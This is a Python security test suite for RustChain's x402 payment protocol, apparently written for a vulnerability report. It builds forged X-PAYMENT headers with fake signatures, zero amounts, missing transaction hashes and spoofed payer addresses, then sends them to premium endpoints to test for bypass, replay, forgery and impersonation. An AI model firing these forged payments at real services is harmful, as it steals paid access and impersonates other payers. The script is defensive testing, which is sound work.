#!/usr/bin/env python3
"""
x402 Payment Protocol Security Test Suite
==========================================
Tests for vulnerabilities in RustChain's x402 implementation.

⚠️  IMPORTANT: Run against a TEST node only! Do NOT test against production.
    Set TEST_MODE=True to run against localhost, or update TARGET_HOST.

Usage:
    python3 x402_security_test.py                    # Dry run (shows what would be tested)
    python3 x402_security_test.py --live             # Run against TEST_HOST
    python3 x402_security_test.py --live --target https://test.example.com
"""

import argparse
import json
import base64
import time
import sys
from urllib.parse import urljoin

# Try to import requests, fail gracefully
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("⚠️  'requests' library not installed. Running in DRY-RUN mode.")
    print("   Install with: pip install requests")
    print()


# ============================================================================
# CONFIGURATION
# ============================================================================

DRY_RUN_TARGET = "https://rustchain.org"  # Used when --live not specified
TEST_HOST = "http://localhost:8004"       # Local test node

PREMIUM_ENDPOINTS = [
    "/api/premium/reputation",
    "/api/premium/contracts/export",
]

X402_ENDPOINTS = [
    "/api/x402/status",
    "/api/x402/payments",
]

WALLET_ENDPOINTS = [
    "/api/agents/{agent_id}/wallet",
]


# ============================================================================
# PAYLOAD BUILDERS
# ============================================================================

def build_fake_payment_header(payer="0x" + "AB" * 20, max_amount="999999", resource="/api/premium/reputation"):
    """Build a fake X-PAYMENT header with attacker-controlled values."""
    payload = {
        "payment_handle": "fake_handle_" + str(int(time.time())),
        "maxAmount": max_amount,  # ← Amount not verified!
        "asset": "USDC",
        "resource": resource,
        "payer_address": payer,
        "nonce": "nonce_replay_test_" + str(int(time.time() * 1000)),
        "tx_hash": "0x" + "00" * 32,
        "signature": "FAKE_SIGNATURE_DOES_NOT_VERIFY",
        "verified": False,
    }
    return base64.urlsafe_b64encode(json.dumps(payload).encode()).decode()


def build_payment_without_txhash():
    """Build a payment header with missing tx_hash (forged receipt test)."""
    payload = {
        "payment_handle": "no_tx_hash_" + str(int(time.time())),
        "maxAmount": "0",
        "asset": "USDC",
        "resource": "/api/premium/reputation",
        "payer_address": "0x" + "CC" * 20,
        "nonce": "no_tx_nonce_" + str(int(time.time())),
        # tx_hash deliberately omitted
    }
    return base64.urlsafe_b64encode(json.dumps(payload).encode()).decode()


# ============================================================================
# TEST CASES
# ============================================================================

class SecurityTest:
    """Base class for security tests."""
    
    def __init__(self, name, severity, description, cwe):
        self.name = name
        self.severity = severity
        self.description = description
        self.cwe = cwe
        self.result = None
        
    def run(self, target, dry_run=True):
        raise NotImplementedError
    
    def print_result(self, passed, details=""):
        icon = "✓" if passed else "✗"
        vuln = "VULNERABLE" if not passed else "PROTECTED"
        print(f"  [{icon}] {self.name} ({self.severity}): {vuln}")
        if details:
            print(f"      {details}")


class Test_AuthBypass(SecurityTest):
    """TEST 1: Can we access premium endpoints with a fake X-PAYMENT header?"""
    
    def __init__(self):
        super().__init__(
            "Auth Bypass via Fake X-PAYMENT",
            "CRITICAL",
            "X-PAYMENT header content is never verified",
            "CWE-345"
        )
    
    def run(self, target, dry_run=True):
        if dry_run:
            self.print_result(False, f"[DRY RUN] Would send GET /api/premium/reputation with fake X-PAYMENT header to {target}")
            self.result = "DRY_RUN"
            return False
        
        fake_header = build_fake_payment_header()
        try:
            r = requests.get(
                urljoin(target, "/api/premium/reputation"),
                headers={"X-PAYMENT": fake_header},
                timeout=10
            )
            if r.status_code == 200:
                self.print_result(False, f"Got 200 OK — data leaked!")
                return False  # Vulnerable
            else:
                self.print_result(True, f"Got {r.status_code} — endpoint protected")
                return True  # Protected
        except Exception as e:
            self.print_result(True, f"Request failed: {e}")
            return True


class Test_ReplayAttack(SecurityTest):
    """TEST 2: Can we replay the same X-PAYMENT header multiple times?"""
    
    def __init__(self):
        super().__init__(
            "Payment Replay Attack",
            "HIGH",
            "No nonce tracking — same header accepted multiple times",
            "CWE-294"
        )
    
    def run(self, target, dry_run=True):
        if dry_run:
            self.print_result(False, f"[DRY RUN] Would send same X-PAYMENT header 3 times to {target}")
            self.result = "DRY_RUN"
            return False
        
        fake_header = build_fake_payment_header()
        statuses = []
        for i in range(3):
            try:
                r = requests.get(
                    urljoin(target, "/api/premium/reputation"),
                    headers={"X-PAYMENT": fake_header},
                    timeout=10
                )
                statuses.append(r.status_code)
            except Exception as e:
                statuses.append(f"ERR: {e}")
        
        if len(set(statuses)) == 1 and statuses[0] == 200:
            self.print_result(False, f"All 3 requests got 200 OK — replay works! Statuses: {statuses}")
            return False  # Vulnerable
        else:
            self.print_result(True, f"Statuses: {statuses}")
            return True


class Test_AmountManipulation(SecurityTest):
    """TEST 3: Can we specify an arbitrary maxAmount in the payment header?"""
    
    def __init__(self):
        super().__init__(
            "Amount Manipulation",
            "HIGH",
            "maxAmount field in X-PAYMENT is never validated server-side",
            "CWE-347"
        )
    
    def run(self, target, dry_run=True):
        if dry_run:
            self.print_result(False, "[DRY RUN] Would send X-PAYMENT with maxAmount=0 when actual price is higher")
            self.result = "DRY_RUN"
            return False
        
        # Try with 0 amount
        fake_header = build_fake_payment_header(max_amount="0")
        try:
            r = requests.get(
                urljoin(target, "/api/premium/reputation"),
                headers={"X-PAYMENT": fake_header},
                timeout=10
            )
            if r.status_code == 200:
                self.print_result(False, f"Accepted payment with maxAmount=0 — amount not verified!")
                return False  # Vulnerable
            else:
                self.print_result(True, f"Got {r.status_code} — amount may be verified")
                return True
        except Exception as e:
            self.print_result(True, f"Request failed: {e}")
            return True


class Test_ReceiptForgery(SecurityTest):
    """TEST 4: Can we forge a payment receipt without a valid tx_hash?"""
    
    def __init__(self):
        super().__init__(
            "Receipt Forgery",
            "MEDIUM",
            "tx_hash field is never verified against the blockchain",
            "CWE-502"
        )
    
    def run(self, target, dry_run=True):
        if dry_run:
            self.print_result(False, "[DRY RUN] Would send X-PAYMENT without tx_hash to /api/x402/payments")
            self.result = "DRY_RUN"
            return False
        
        fake_header = build_payment_without_txhash()
        try:
            # Check payment history
            r = requests.get(
                urljoin(target, "/api/x402/payments"),
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                unknown_entries = [p for p in data.get('payments', []) 
                                   if p.get('payer_address') in ('unknown', None, '')]
                if unknown_entries or data.get('total', 0) > 0:
                    self.print_result(False, f"Found {data.get('total', 0)} total entries — tx_hash not verified")
                    return False  # Vulnerable
            self.print_result(True, "No forged entries found")
            return True
        except Exception as e:
            self.print_result(True, f"Request failed: {e}")
            return True


class Test_MiddlewareBypass(SecurityTest):
    """TEST 5: Can we access premium endpoints in free mode without any payment?"""
    
    def __init__(self):
        super().__init__(
            "Free Mode Bypass",
            "CRITICAL",
            "All prices set to '0' — is_free() always returns True",
            "CWE-285"
        )
    
    def run(self, target, dry_run=True):
        if dry_run:
            self.print_result(False, "[DRY RUN] Would check /api/x402/status for pricing_mode")
            self.result = "DRY_RUN"
            return False
        
        try:
            r = requests.get(urljoin(target, "/api/x402/status"), timeout=10)
            if r.status_code == 200:
                data = r.json()
                pricing_mode = data.get('pricing_mode', 'unknown')
                if pricing_mode == 'free':
                    self.print_result(False, f"pricing_mode='free' — all endpoints unprotected!")
                    return False  # Vulnerable
                else:
                    self.print_result(True, f"pricing_mode='{pricing_mode}'")
                    return True
            else:
                self.print_result(True, f"Got {r.status_code}")
                return True
        except Exception as e:
            self.print_result(True, f"Request failed: {e}")
            return True


class Test_ClientImpersonation(SecurityTest):
    """TEST 6: Can we impersonate another user by setting their address in the payment header?"""
    
    def __init__(self):
        super().__init__(
            "Client Impersonation",
            "MEDIUM",
            "payer_address in X-PAYMENT is never verified against a signature",
            "CWE-302"
        )
    
    def run(self, target, dry_run=True):
        if dry_run:
            self.print_result(False, "[DRY RUN] Would send X-PAYMENT with arbitrary payer_address")
            self.result = "DRY_RUN"
            return False
        
        # Try to set payer_address to someone else's address
        victim_address = "0x" + "DE" * 20
        fake_header = build_fake_payment_header(payer=victim_address)
        try:
            r = requests.get(
                urljoin(target, "/api/x402/payments"),
                headers={"X-PAYMENT": fake_header},
                timeout=10
            )
            # Check if our fake address appears in payment logs
            if r.status_code == 200:
                data = r.json()
                our_entries = [p for p in data.get('payments', []) 
                               if victim_address.lower() in str(p).lower()]
                if our_entries:
                    self.print_result(False, f"Our fake address was logged — impersonation possible!")
                    return False
            self.print_result(True, "No impersonation detected")
            return True
        except Exception as e:
            self.print_result(True, f"Request failed: {e}")
            return True


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(description="x402 Security Test Suite")
    parser.add_argument("--live", action="store_true", help="Run against live target (not dry-run)")
    parser.add_argument("--target", default=None, help="Target URL (default: localhost for --live, dry-run target otherwise)")
    parser.add_argument("--test", default=None, help="Run specific test by name")
    args = parser.parse_args()
    
    dry_run = not args.live
    target = args.target or (TEST_HOST if args.live else DRY_RUN_TARGET)
    
    if dry_run:
        print("⚠️  DRY RUN MODE — No actual requests will be made")
        print(f"   To run against a test server: python3 {sys.argv[0]} --live --target http://localhost:8004")
        print()
    
    print("=" * 70)
    print("RustChain x402 Payment Protocol — Security Test Suite")
    print(f"Target: {target}")
    print(f"Mode: {'LIVE' if not dry_run else 'DRY RUN'}")
    print("=" * 70)
    print()
    
    if not dry_run and not HAS_REQUESTS:
        print("❌ ERROR: 'requests' library required for live mode")
        print("   Install with: pip install requests")
        sys.exit(1)
    
    tests = [
        Test_MiddlewareBypass(),
        Test_AuthBypass(),
        Test_ReplayAttack(),
        Test_AmountManipulation(),
        Test_ReceiptForgery(),
        Test_ClientImpersonation(),
    ]
    
    if args.test:
        tests = [t for t in tests if args.test.lower() in t.name.lower()]
        if not tests:
            print(f"❌ Unknown test: {args.test}")
            print(f"   Available: {', '.join(t.name for t in tests)}")
            sys.exit(1)
    
    vulnerabilities_found = 0
    for i, test in enumerate(tests, 1):
        print(f"\n[{i}/{len(tests)}] {test.name}")
        print(f"    Severity: {test.severity} | {test.cwe}")
        print(f"    {test.description}")
        try:
            protected = test.run(target, dry_run=dry_run)
            if not protected:
                vulnerabilities_found += 1
        except Exception as e:
            print(f"  [!] Test error: {e}")
    
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Tests run: {len(tests)}")
    print(f"Vulnerabilities found: {vulnerabilities_found}")
    print(f"Protected endpoints: {len(tests) - vulnerabilities_found}")
    print()
    
    if vulnerabilities_found > 0:
        print("⚠️  RECOMMENDATION: Implement the fixes described in SECURITY_REPORT.md")
    else:
        print("✓ All tests passed — no vulnerabilities detected")
    
    if dry_run:
        print("\n📄 See SECURITY_REPORT.md for full vulnerability details and remediation steps.")
    
    sys.exit(0 if vulnerabilities_found == 0 else 1)


if __name__ == "__main__":
    main()
